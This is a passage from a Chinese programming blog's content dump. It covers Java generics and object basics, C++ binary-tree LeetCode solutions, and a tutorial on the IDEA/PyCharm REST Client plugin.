放到List中呢？答案是使用下限通配符来实现逆变。正如大家所熟知的一个概念：在Java中，所有类型的父类型都是Object类型，方法的形参类型是Object，那这个方法就能接受任何类型的参数传递进来。这个推论正是实现该需求的关键所在。根据上面的推导，我们可能会这么认为：既然Object是所有类型的父类型，那么List肯定是所有List参数化类型的父类型。但事实却不是这样的，即2个类型实参之间具有子类型关系，但使用它们对同一泛型进行参数化后的类型并没有保持这种子类型关系。与上文描述一致。List表示的只是它能够存储任意元素类型，而并没有表示它是所有参数化类型的父类型。所以这种解决方案是完全行不通的。 并且，还有一点也许会有疑问，子类中的桥方法Object getValue()和Date getValue()是同 时存在的，可是如果是常规的两个方法，他们的方法签名是一样的，也就是说虚拟机根本不能分别这两个方法。如果是我们自己编写Java代码，这样的代码是无法通过编译器的检查的，但是虚拟机却是允许这样做的，因为虚拟机通过参数类型和返回类型来确定一个方法，所以编译器为了实现泛型的多态允许自己做这个看起来“不合法”的事情，然后交给虚拟器去区别。 总结： 在Java中，数组具有协变性，简单点来说就是子类型数组可以赋值给父类型数组进行使用，比如将Integer数组赋值给Object数组，这样来使用数组不会有警告甚至报错，但会存在运行时出错的风险，所以数组的协变性是具有瑕疵的，虽然它能这么用，但我们必须为此而承受一定风险。 Java泛型就不可以做出像数组这样的行为，因为泛型没有内建的协变类型，Java泛型具有不可变性（不具备协变性和逆变性）。但是，为了兼容遗留代码而被保留下来的原生类型确实可以做出这样的行为，但同时我们也非常清楚使用它就像使用数组的协变性一样意味着代码变得不再安全。 所以，制定Java标准的那群人想出了个法子使得泛型像数组一样具有这些特性，同时这种代替原生类型的方案必须是绝对安全的：他们通过给泛型增加通配符特性使得泛型在参数化后具有协变性或逆变性。 3-4.泛型类型变量不能是基本数据类型不能用类型参数替换基本类型。就比如，没有ArrayList，只有ArrayList。因为当类型擦除后，ArrayList的原始类型变为Object，但是Object类型不能存储double值，只能引用Double的值。 3-5.编译时集合的instanceof1ArrayList&lt;String&gt; arrayList = new ArrayList&lt;String&gt;(); 因为类型擦除之后，ArrayList只剩下原始类型，泛型信息String不存在了。 那么，编译时进行类型查询的时候使用下面的方法是错误的 1if( arrayList instanceof ArrayList&lt;String&gt;) 3-6.泛型在静态方法和静态类中的问题泛型类中的静态方法和静态变量不可以使用泛型类所声明的泛型类型参数 举例说明： 123456public class Test2&lt;T&gt; { public static T one; //编译错误 public static T show(T one){ //编译错误 return null; } } 因为泛型类中的泛型参数的实例化是在定义对象的时候指定的，而静态变量和静态方法不需要使用对象来调用。对象都没有创建，如何确定这个泛型参数是何种类型，所以当然是错误的。 但是要注意区分下面的一种情况： 123456public class Test2&lt;T&gt; { public static &lt;T &gt;T show(T one){ //这是正确的 return null; } } 因为这是一个泛型方法，在泛型方法中使用的T是自己在方法中定义的 T，而不是泛型类中的T。 ==和equals的区别 == : 它的作用是判断两个对象的地址是不是相等。即判断两个对象是不是同一个对象。(基本数据类型==比较的是值，引用数据类型==比较的是内存地址)equals() 方法存在两种使用情况： 情况 1：类没有覆盖 equals()方法。则通过equals()比较该类的两个对象时，等价于通过“==”比较这两个对象。使用的默认是 Object类equals()方法。 情况 2：类覆盖了 equals()方法。一般，我们都覆盖 equals()方法来两个对象的内容相等；若它们的内容相等，则返回 true(即，认为这两个对象相等)。 String 中的 equals 方法是被重写过的，因为 Object 的 equals 方法是比较的对象的内存地址，而 String 的 equals 方法比较的是对象的值。 当创建 String 类型的对象时，虚拟机会在常量池中查找有没有已经存在的值和要创建的值相同的对象，如果有就把它赋给当前引用。如果没有就在常量池中重新创建一个 String 对象。 hashCode()与 equals()hashCode()介绍:hashCode() 的作用是获取哈希码，也称为散列码；它实际上是返回一个 int 整数。这个哈希码的作用是确定该对象在哈希表中的索引位置。hashCode()定义在 JDK 的 Object 类中，这就意味着 Java 中的任何类都包含有 hashCode() 函数。另外需要注意的是： Object 的 hashcode 方法是本地方法，也就是用 c 语言或 c++ 实现的，该方法通常用来将对象的 内存地址 转换为整数之后返回。 散列表存储的是键值对(key-value)，它的特点是：能根据“键”快速的检索出对应的“值”。这其中就利用到了散列码！（可以快速找到所需要的对象） 为什么要有 hashCode？我们以“HashSet 如何检查重复”为例子来说明为什么要有 hashCode？ 当你把对象加入 HashSet 时，HashSet 会先计算对象的 hashcode 值来判断对象加入的位置，同时也会与其他已经加入的对象的 hashcode 值作比较，如果没有相符的 hashcode，HashSet 会假设对象没有重复出现。但是如果发现有相同 hashcode 值的对象，这时会调用 equals（）方法来检查 hashcode 相等的对象是否真的相同。如果两者相同，HashSet 就不会让其加入操作成功。如果不同的话，就会重新散列到其他位置。（Head fist java》第二版）。这样我们就大大减少了 equals 的次数，相应就大大提高了执行速度。 为什么重写 equals 时必须重写 hashCode 方法？ 如果两个对象相等，则 hashcode 一定也是相同的。两个对象相等,对两个对象分别调用 equals 方法都返回 true。但是，两个对象有相同的 hashcode 值，它们也不一定是相等的 。因此，equals 方法被覆盖过，则 hashCode 方法也必须被覆盖。 hashCode()的默认行为是对堆上的对象产生独特值。如果没有重写 hashCode()，则该 class 的两个对象无论如何都不会相等（即使这两个对象指向相同的数据） String类对hashcode的重写 1234567891011121314151617181920212223242526/** * Returns a hash code for this string. The hash code for a * {@code String} object is computed as * &lt;blockquote&gt;&lt;pre&gt; * s[0]*31^(n-1) + s[1]*31^(n-2) + ... + s[n-1] * &lt;/pre&gt;&lt;/blockquote&gt; * using {@code int} arithmetic, where {@code s[i]} is the * &lt;i&gt;i&lt;/i&gt;th character of the string, {@code n} is the length of * the string, and {@code ^} indicates exponentiation. * (The hash value of the empty string is zero.) * * @return a hash code value for this object. */public int hashCode() { int h = hash; if (h == 0 &amp;&amp; value.length &gt; 0) { char val[] = value; for (int i = 0; i &lt; value.length; i++) { h = 31 * h + val[i]; } hash = h; } return h;} 在《Effective Java》第 42 页就有对 hashCode 为什么采用 31 做了说明：之所以使用 31， 是因为他是一个奇素数。如果乘数是偶数，并且乘法溢出的话，信息就会丢失，因为与2相乘等价于移位运算（低位补0）。使用素数的好处并不很明显，但是习惯上使用素数来计算散列结果。 31 有个很好的性能，即用移位和减法来代替乘法，可以得到更好的性能： 31 * i == (i &lt;&lt; 5）- i， 现代的 VM 可以自动完成这种优化。这个公式可以很简单的推导出来。31可以由31 * i == (i &lt;&lt; 5) - i来表示，现在很多虚拟机里面都有做相关优化，使用31的原因可能是为了更好的分配hash地址，并且31只占用5bits！在java乘法中如果数字相乘过大会导致溢出的问题，从而导致数据的丢失，而31则是素数（质数）而且不是很长的数字，最终它被选择为相乘的系数的原因。 Java中的几种基本数据类型注意： Java 里使用 long 类型的数据一定要在数值后面加上 L，否则将作为整型解析： char a = ‘h’char :单引号，String a = “hello” :双引号 Java 基本类型的包装类的大部分都实现了常量池技术，即 Byte,Short,Integer,Long,Character,Boolean；前面 4 种包装类默认创建了数值[-128，127] 的相应类型的缓存数据，Character创建了数值在[0,127]范围的缓存数据，Boolean 直接返回True Or False。如果超出对应范围仍然会去创建新的对象。 123public static Boolean valueOf(boolean b) { return (b ? TRUE : FALSE);} 123456789private static class CharacterCache { private CharacterCache(){} static final Character cache[] = new Character[127 + 1]; static { for (int i = 0; i &lt; cache.length; i++) cache[i] = new Character((char)i); } } 12345678/***此方法将始终缓存-128 到 127（包括端点）范围内的值，并可以缓存此范围之外的其他值。*/ public static Integer valueOf(int i) { if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i); } 常量池是为了避免频繁的创建和销毁对象而影响系统性能，其实现了对象的共享。例如字符串常量池，在编译阶段就把所有的字符串文字放到一个常量池中。（1）节省内存空间：常量池中所有相同的字符串常量被合并，只占用一个空间。（2）节省运行时间：比较字符串时，==比equals()快。对于两个引用变量，只用==判断引用是否相等，也就可以判断实际值是否相等。 为啥把缓存设置为[-128，127]区间？1.技术规范。JLS7 5.1.7：If the value p being boxed is an integer literal of type int between -128 and 127 inclusive (§3.10.1), or the boolean literal true or false (§3.10.3), or a character literal between ‘\\u0000’ and ‘\\u007f’ inclusive (§3.10.4), then let a and b be the results of any two boxing conversions of p . It is always the case that a == b .2.性能和资源之间的权衡（当然也可以调整缓存的正向最大值，自己看 IntegerCache 类的实现）。 如果超出了范围，会从堆区new一个Integer对象来存放值。 123456789Integer a1 = new Integer(12); Integer a2 = new Integer(12); Integer b1 = -129; Integer b2 = -129; Integer c1 = 128; Integer c2 = -128; System.out.println(a1 == a2); //false System.out.println(b1==b2); //false System.out.println(c1 == c2); //false 两种浮点数类型的包装类 Float,Double 并没有实现常量池技术。 123456789Integer i1 = 33;Integer i2 = 33;System.out.println(i1 == i2);// 输出 trueInteger i11 = 333;Integer i22 = 333;System.out.println(i11 == i22);// 输出 falseDouble i3 = 1.2;Double i4 = 1.2;System.out.println(i3 == i4);// 输出 false 方法（函数）Java 程序设计语言总是采用按值调用。也就是说，方法得到的是所有参数值的一个拷贝，也就是说，方法不能修改传递给它的任何参数变量的内容。在 swap 方法中，a、b 的值进行交换，并不会影响到 num1、num2。因为，a、b 中的值，只是从 num1、num2 的复制过来的。也就是说，a、b 相当于 num1、num2 的副本，副本的内容无论怎么修改，都不会影响到原件本身。 而对象引用作为参数就不一样 1234567891011public static void main(String[] args) { int[] arr = { 1, 2, 3, 4, 5 }; System.out.println(arr[0]); change(arr); System.out.println(arr[0]);}public static void change(int[] array) { // 将数组的第一个元素变为0 array[0] = 0;} 结果： 1210 array 被初始化 arr 的拷贝也就是一个对象的引用，也就是说 array 和 arr 指向的是同一个数组对象。 因此，外部对引用对象的改变会反映到所对应的对象上。 我们已经看到，实现一个改变对象参数状态的方法并不是一件难事。理由很简单，方法得到的是对象引用的拷贝，对象引用及其他的拷贝同时引用同一个对象。 很多程序设计语言（特别是，C++和 Pascal)提供了两种参数传递的方式：值调用和引用调用。有些程序员认为 Java 程序设计语言对对象采用的是引用调用，实际上，这种理解是不对的。由于这种误解具有一定的普遍性，所以下面给出一个反例来详细地阐述一下这个问题。 12345678910111213141516171819public class Test { public static void main(String[] args) { // TODO Auto-generated method stub Student s1 = new Student(\"小张\"); Student s2 = new Student(\"小李\"); Test.swap(s1, s2); System.out.println(\"s1:\" + s1.getName()); System.out.println(\"s2:\" + s2.getName()); } public static void swap(Student x, Student y) { Student temp = x; x = y; y = temp; System.out.println(\"x:\" + x.getName()); System.out.println(\"y:\" + y.getName()); }} 结果： 1234x:小李y:小张s1:小张s2:小李 解析： 交换之前： 交换之后： 通过上面两张图可以很清晰的看出： 方法并没有改变存储在变量 s1 和 s2 中的对象引用。swap 方法的参数 x 和 y 被初始化为两个对象引用的拷贝，这个方法交换的是这两个拷贝 总结 Java 程序设计语言对对象采用的不是引用调用，实际上，对象引用是按 值传递的。 下面再总结一下 Java 中方法参数的使用情况： 一个方法不能修改一个基本数据类型的参数（即数值型或布尔型）。 一个方法可以改变一个对象参数的状态。 一个方法不能让对象参数引用一个新的对象。 参考： 《Java 核心技术卷 Ⅰ》基础知识第十版第四章 4.5 小节 重载和重写重载就是同样的一个方法能够根据输入数据的不同，做出不同的处理 重写就是当子类继承自父类的相同方法，输入数据一样，但要做出有别于父类的响应时，你就要覆盖父类方法《Java 核心技术》中是这么说的 综上：重载就是同一个类中多个同名方法根据不同的传参来执行不同的逻辑处理。 重写发生在运行期，是子类对父类的允许访问的方法的实现过程进行重新编写。 返回值类型、方法名、参数列表必须相同，抛出的异常范围小于等于父类，访问修饰符范围大于等于父类。 如果父类方法访问修饰符为 private/final/static 则子类就不能重写该方法，但是被 static 修饰的方法能够被再次声明。 构造方法无法被重写 综上：重写就是子类对父类方法的重新改造，外部样子不能改变，内部逻辑可以改变 深拷贝 vs 浅拷贝浅拷贝：对基本数据类型进行值传递，对引用数据类型进行引用传递般的拷贝，此为浅拷贝。深拷贝：对基本数据类型进行值传递，对引用数据类型，创建一个新的对象，并复制其内容，此为深拷贝。","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://czqu.net/tags/java/"},{"name":"基础","slug":"基础","permalink":"https://czqu.net/tags/%E5%9F%BA%E7%A1%80/"},{"name":"jvm","slug":"jvm","permalink":"https://czqu.net/tags/jvm/"},{"name":"泛型","slug":"泛型","permalink":"https://czqu.net/tags/%E6%B3%9B%E5%9E%8B/"}],"author":"陈子琦"},{"title":"算法与数据结构学习笔记：二叉树","slug":"release/2020-7-25-binary_tree","date":"2020-08-06T01:13:10.000Z","updated":"2020-08-06T01:13:10.000Z","comments":true,"path":"posts/49261/","permalink":"https://czqu.net/posts/49261/","excerpt":"","text":"知识点二叉树遍历前序遍历：先访问根节点，再前序遍历左子树，再前序遍历右子树 中序遍历：先中序遍历左子树，再访问根节点，再中序遍历右子树 后序遍历：先后序遍历左子树，再后序遍历右子树，再访问根节点 注意点 以根访问顺序决定是什么遍历 左子树都是优先右子树 前序遍历例题：https://leetcode-cn.com/problems/binary-tree-preorder-traversal/ 递归123456789101112131415161718192021222324/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: vector&lt;int&gt; ans; vector&lt;int&gt; preorderTraversal(TreeNode* root) { if(root==NULL) return ans; // 先访问根再访问左右 ans.push_back(root-&gt;val); preorderTraversal(root-&gt;left); preorderTraversal(root-&gt;right); return ans; }}; 非递归12345678910111213141516171819202122232425262728293031323334/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: vector&lt;int&gt; preorderTraversal(TreeNode* root) { vector&lt;int&gt; ans; if(root==NULL) return ans; stack&lt;TreeNode*&gt; st; TreeNode *cur=root; while(cur!=NULL||!st.empty()) { while(cur!=NULL) { ans.push_back(cur-&gt;val); st.push(cur); cur=cur-&gt;left; } cur=st.top(); st.pop(); cur=cur-&gt;right; } return ans; }}; 也可以这么写 12345678910111213141516171819202122232425262728293031/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: vector&lt;int&gt; preorderTraversal(TreeNode* root) { vector&lt;int&gt; ans; if(root==NULL) return ans; stack&lt;TreeNode*&gt; st; st.push(root); while(!st.empty()) { auto cur=st.top(); st.pop(); ans.push_back(cur-&gt;val); if(cur-&gt;right) st.push(cur-&gt;right); if(cur-&gt;left) st.push(cur-&gt;left); } return ans; }}; 中序遍历例题：https://leetcode-cn.com/problems/binary-tree-inorder-traversal/ 递归12345678910111213141516171819202122/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: vector&lt;int&gt;ans; vector&lt;int&gt; inorderTraversal(TreeNode* root) { if(root==NULL) return ans; inorderTraversal(root-&gt;left); ans.push_back(root-&gt;val); inorderTraversal(root-&gt;right); return ans; }}; 后序遍历：例题：https://leetcode-cn.com/problems/binary-tree-postorder-traversal/ 递归：12345678910111213141516171819202122/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: vector&lt;int&gt; ans; vector&lt;int&gt; postorderTraversal(TreeNode* root) { if(root==NULL) return ans; postorderTraversal(root-&gt;left); postorderTraversal(root-&gt;right); ans.push_back(root-&gt;val); return ans; }}; 分治法应用先分别处理局部，再合并结果 适用场景 快速排序 归并排序 二叉树相关问题 分治法模板 递归返回条件 分段处理 合并结果 123456789101112131415ResultType traversal(TreeNode *root) { // nil or leaf if (!root) { // do something and return } // Divide auto left = traversal(root-&gt;left); auto right = traversal(root-&gt;right); // Conquer auto result = merge(left, right); return result;} 典型示例12345678910111213141516171819// V2：通过分治法遍历二叉树vector&lt;int&gt; preOrderTraversal(TreeNode *root) { return divideAndConquer(root);}vector&lt;int&gt; divideAndConquer(TreeNode *root) { vector&lt;int&gt; result; if (!root) { return result; } // 分治(Divide) auto left = divideAndConquer(root-&gt;left); auto right = divideAndConquer(root-&gt;right); // 合并结果(Conquer) result.push_back(root-&gt;val); result.insert(result.end(), left.begin(), left.end()); result.insert(result.end(), right.begin(), right.end()); return result;} 归并排序123456789101112131415161718192021222324252627282930313233343536373839template&lt;typename T&gt;static void MergeSort(T arr[], int len) { auto tmp = new T[len]; mergeSort(arr, 0, len - 1, tmp); delete[] tmp;}template&lt;typename T&gt;static void mergeSort(T arr[], int begin, int end, T tmp[]) { if (begin + 1 &gt;= end) { return; } auto mid = begin + (end - begin) / 2; auto begin1 = begin; auto end1 = mid; auto begin2 = mid + 1; auto end2 = end; mergeSort(arr, begin1, end1, tmp); mergeSort(arr, begin2, end2, tmp); // merge two parts auto index = begin; while (begin1 &lt;= end1 &amp;&amp; begin2 &lt;= end2) { tmp[index++] = arr[begin1] &lt; arr[begin2] ? arr[begin1++] : arr[begin2++]; } while (begin1 &lt;= end1) { tmp[index++] = arr[begin1++]; } while (begin2 &lt;= end2) { tmp[index++] = arr[begin2++]; } for (int i = begin; i &lt;= end; ++i) { arr[i] = tmp[i]; }} 快速排序123456789101112131415161718192021222324252627template&lt;typename T&gt;static void QuickSort(T arr[], int len) { quickSort(arr, 0, len - 1);}template&lt;typename T&gt;static void quickSort(T arr[], int begin, int end) { if (begin &gt;= end) { return; } auto pivot = partition(arr, begin, end); quickSort(arr, begin, pivot - 1); quickSort(arr, pivot + 1, end);}template&lt;typename T&gt;static int partition(T arr[], int begin, int end) { auto base = arr[end]; auto lessInsert = begin; for (int i = begin; i &lt; end; ++i) { if (arr[i] &lt; base) { swap(arr[lessInsert++], arr[i]); } } swap(arr[lessInsert], arr[end]); return lessInsert;} 常见题目示例104. 二叉树的最大深度1234567891011121314151617181920212223242526/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: int maxDepth(TreeNode* root) { if(root==NULL) return 0; int left=maxDepth(root-&gt;left); int right=maxDepth(root-&gt;right); if(left&gt;right) return left+1; else return right+1; }}; 110. 平衡二叉树 给定一个二叉树，判断它是否是高度平衡的二叉树。 本题中，一棵高度平衡二叉树定义为： 一个二叉树每个节点 的左右两个子树的高度差的绝对值不超过1。 示例 1: 给定二叉树 [3,9,20,null,null,15,7] 3/ 9 20 / 15 7返回 true 。 示例 2: 给定二叉树 [1,2,2,3,3,null,null,4,4] 1 / 2 2 / 3 3/ 4 4返回 false 。 从底至顶思路：分治法，左边平衡 &amp;&amp; 右边平衡 &amp;&amp; 左右两边高度 &lt;= 1， 因为需要返回是否平衡及高度，要么返回两个数据，要么合并两个数据， 所以用-1 表示不平衡，&gt;0 表示树高度（二义性：一个变量有两种含义）。 注意 一般工程中，结果通过两个变量来返回，不建议用一个变量表示两种含义 123456789101112131415161718192021222324252627282930313233343536373839/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: bool isBalanced(TreeNode* root) { if(maxDepth(root)==-1) { return false; } return true; } int maxDepth(TreeNode *root) { if(root==NULL) { return 0; } int left=maxDepth(root-&gt;left); int right=maxDepth(root-&gt;right); if(left==-1||right==-1||left-right&gt;1||right-left&gt;1) { return -1; } if(left&gt;right) { return left+1; } return right+1; }}; 124. 二叉树中的最大路径和 给定一个非空二叉树，返回其最大路径和。 本题中，路径被定义为一条从树中任意节点出发，达到任意节点的序列。该路径至少包含一个节点，且不一定经过根节点。 示例 1: 输入: [1,2,3] 1 / 2 3 输出: 6示例 2: 输入: [-10,9,20,null,null,15,7] -10/ 9 20 / 15 7 输出: 42 12345678910111213141516171819202122232425262728293031/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: int maxPathSum(TreeNode* root) { int res=INT_MIN; helper(root,res); return res; } int helper(TreeNode*root,int &amp;val) { if(root==NULL) return 0; int left=max(0,helper(root-&gt;left,val)); int right=max(0,helper(root-&gt;right,val)); int lmr=root-&gt;val+left+right; int ret=root-&gt;val+max(left,right); val=max(val,max(lmr,ret)); return ret; }}; 236. 二叉树的最近公共祖先 给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。 百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。” 例如，给定如下二叉树: root = [3,5,1,6,2,0,8,null,null,7,4] 示例 1: 123输入: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1输出: 3解释: 节点 5 和节点 1 的最近公共祖先是节点 3。 示例 2: 123输入: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 4输出: 5解释: 节点 5 和节点 4 的最近公共祖先是节点 5。因为根据定义最近公共祖先节点可以为节点本身。 思路：分治法，有左子树的公共祖先或者有右子树的公共祖先，就返回子树的祖先，否则返回根节点 123456789101112131415161718192021222324252627282930/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: TreeNode* lowestCommonAncestor(TreeNode* root, TreeNode* p, TreeNode* q) { if(root==NULL) return root; // 相等 直接返回root节点即可 if(root==p||root==q) return root; auto left=lowestCommonAncestor(root-&gt;left,p,q); auto right=lowestCommonAncestor(root-&gt;right,p,q); // 左右两边都不为空，则根节点为祖先 if(left!=NULL&amp;&amp;right!=NULL) return root; if(left!=NULL) return left; if(right!=NULL) return right; return NULL; }}; BFS 层次应用102. 二叉树的层序遍历 给你一个二叉树，请你返回其按 层序遍历 得到的节点值。 （即逐层地，从左到右访问所有节点）。 12345678910111213141516171819202122232425262728293031323334353637/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: vector&lt;vector&lt;int&gt;&gt; levelOrder(TreeNode* root) { vector&lt;vector&lt;int&gt;&gt; res; if(root==NULL) return res; queue&lt;TreeNode *&gt; q; q.push(root); while(!q.empty()) { int currentLevelSize=q.size(); vector&lt;int&gt; level; for(int i=0;i&lt;currentLevelSize;i++) { auto cur=q.front(); level.push_back(cur-&gt;val); q.pop(); if(cur-&gt;left) q.push(cur-&gt;left); if(cur-&gt;right) q.push(cur-&gt;right); } res.push_back(level); } return res; }}; 107. 二叉树的层次遍历 II 给定一个二叉树，返回其节点值自底向上的层次遍历。 （即按从叶子节点所在层到根节点所在的层，逐层从左向右遍历） 思路：在层级遍历的基础上，翻转一下结果即可 123456789101112131415161718192021222324252627282930313233343536373839/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: vector&lt;vector&lt;int&gt;&gt; levelOrderBottom(TreeNode* root) { vector&lt;vector&lt;int&gt;&gt; res; if(root==NULL) return res; queue&lt;TreeNode*&gt;q; q.push(root); while(!q.empty()) { int curLevelSize=q.size(); vector&lt;int&gt; curLevel; for(int i=0;i&lt;curLevelSize;i++) { auto cur=q.front(); q.pop(); curLevel.push_back(cur-&gt;val); if(cur-&gt;left) q.push(cur-&gt;left); if(cur-&gt;right) q.push(cur-&gt;right); } res.push_back(curLevel); } reverse(res.begin(),res.end()); return res; }}; 103. 二叉树的锯齿形层次遍历 给定一个二叉树，返回其节点值的锯齿形层次遍历。（即先从左往右，再从右往左进行下一层遍历，以此类推，层与层之间交替进行）。 例如：给定二叉树 [3,9,20,null,null,15,7], 3/ 9 20 / 15 7返回锯齿形层次遍历如下： [[3],[20,9],[15,7]] 思路：特定层结果翻转即可 12345678910111213141516171819202122232425262728293031323334353637383940414243/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: vector&lt;vector&lt;int&gt;&gt; zigzagLevelOrder(TreeNode* root) { vector&lt;vector&lt;int&gt;&gt; res; if(root==NULL) return res; queue&lt;TreeNode*&gt; q; q.push(root); bool toggle=false; while(!q.empty()) { int curLevelSize=q.size(); vector&lt;int&gt; curLevel; for(int i=0;i&lt;curLevelSize;i++) { auto cur=q.front(); q.pop(); curLevel.push_back(cur-&gt;val); if(cur-&gt;left) q.push(cur-&gt;left); if(cur-&gt;right) q.push(cur-&gt;right); } if(toggle) { reverse(curLevel.begin(),curLevel.end()); } toggle=!toggle; res.push_back(curLevel); } return res; }}; 二叉搜索树应用98. 验证二叉搜索树 给定一个二叉树，判断其是否是一个有效的二叉搜索树。 假设一个二叉搜索树具有如下特征： 节点的左子树只包含小于当前节点的数。节点的右子树只包含大于当前节点的数。所有左子树和右子树自身必须也是二叉搜索树。 中序遍历12345678910111213141516171819202122232425262728293031323334/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: bool isValidBST(TreeNode* root) { if(root==NULL) return true; vector&lt;int&gt;res; inOrder(root,res); for(int i=0;i&lt;res.size()-1;i++) { if(res[i]&gt;=res[i+1]) return false; } return true; } void inOrder(TreeNode*root,vector&lt;int&gt; &amp;res) { if(root==NULL) return; inOrder(root-&gt;left,res); res.push_back(root-&gt;val); inOrder(root-&gt;right,res); }}; 701. 二叉搜索树中的插入操作 给定二叉搜索树（BST）的根节点和要插入树中的值，将值插入二叉搜索树。 返回插入后二叉搜索树的根节点。 保证原始二叉搜索树中不存在新值。 注意，可能存在多种有效的插入方式，只要树在插入后仍保持为二叉搜索树即可。 你可以返回任意有效的结果。 12345678910111213141516171819202122232425262728/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode() : val(0), left(nullptr), right(nullptr) {} * TreeNode(int x) : val(x), left(nullptr), right(nullptr) {} * TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {} * }; */class Solution {public: TreeNode* insertIntoBST(TreeNode* root, int val) { if(root==nullptr) return new TreeNode(val); if(root-&gt;val&lt;val) { root-&gt;right=insertIntoBST(root-&gt;right,val); } else { root-&gt;left=insertIntoBST(root-&gt;left,val); } return root; }};","categories":[],"tags":[{"name":"cpp","slug":"cpp","permalink":"https://czqu.net/tags/cpp/"},{"name":"算法","slug":"算法","permalink":"https://czqu.net/tags/%E7%AE%97%E6%B3%95/"},{"name":"数据结构","slug":"数据结构","permalink":"https://czqu.net/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"二叉树","slug":"二叉树","permalink":"https://czqu.net/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"}],"author":"陈子琦"},{"title":"Rest Client在idea的使用","slug":"release/2020-7-26-using-rest-client-in-idea","date":"2020-08-06T01:13:10.000Z","updated":"2020-08-06T01:13:10.000Z","comments":true,"path":"posts/34566/","permalink":"https://czqu.net/posts/34566/","excerpt":"","text":"1.安装首先，打开IntelliJ IDEA或pycharm，安装Rest Client。 File -&gt; Setting -&gt; Plug-ins -&gt; Browse Repository 搜索Rest Client，点击右侧的install，稍等片刻会提醒要重启IDEA，重启后安装结束。 2.使用使用时候，从顶层工具栏依次Tools -&gt; HTTP Client -&gt; Test RESTFUL Web Service 打开 之后，IDEA REST Client控制台的界面如下样子。 这个控制台展示的功能区有请求方式，请求参数和请求头的填充等等。 如果需要用户名、密码验证，点击右侧按钮，会弹出填充用户名和密码的窗口。 填完后会自动补充到Authorization 的header里面去。 Rest Client插件会自动将最近执行的50个请求保存到http-requests-log.http 文件中。 该文件存储在项目的.idea /httpRequests/目录下。 使用请求历史记录，用户可以快速导航到特定响应并再次发出请求。 除了构建请求，发起RESTful请求，Rest Client插件还可以完成如下postman不能做到的功能： • 模板构建请求； • 多个环境区分； • 结果断言； • 结果暂存； 添加 token3.pycharm中测试结果断言及生成测试报告先进入rest client插件界面，从顶层工具栏依次Tools -&gt; HTTP Client -&gt; Test RESTFUL Web Service 打开后， REST Client控制台的界面如下样式： 点一下右上方的“Convert request to the new format”，接口请求各个参数自动生成一个配置文件，在IDE上边文件编辑框内。 文件名为：rest-api.http，默认存放在.PyCharm2019.2configscratches。 测试结果断言设置把上面生成的rest-api.http文件内容都删除，重新写入如下内容： 解释： client.test，表示下面的是一个测试用例，第一个参数是测试用例名字，第二个参数是一个函数包含着测试断言。 断言由client.assert带出，第一个参数是判断条件，第二个参数是测试失败时候战士的信息。 鼠标移动到“GET”右侧的按钮，会出现“Run httpbin.org”（Run 后面的是测试接口的链接） 点击弹出的标签，测试执行。Console界面自动展示出执行结果。 点击“Console”标签右侧的“test”标签，可以看到具体执行结果： 自己写一个测试用例和断言仿照上面的例子，写一个测试用例和断言，判断response的headers里面的某一个字段。 还是像上面那样执行测试用例。 “console”标签没变化，但是右侧的“test”标签内容很不一样了。 两个测试用例都通过。 生成检测报告在“test”标签里，点击“Export Test Result”，可以将测试结果导出成测试报告 在弹出对话框中，保存测试报告到指定位置。 测试报告： 测试调试如果想调试测试用例、测试断言，或者想看中间结果，怎么办？ 可以用：client.log函数 看一下修改后的例子： 比如：想要看一下GET接口返回的headers信息，可以直接client.log(response.headers)打印结果。上下的两个client.log(“============”)没有实际意义，只是让结果看起来更容易找到。 像上面提到的那样执行之后，结果在“test”标签页里可以看到： 执行多次后出现的 json 文件 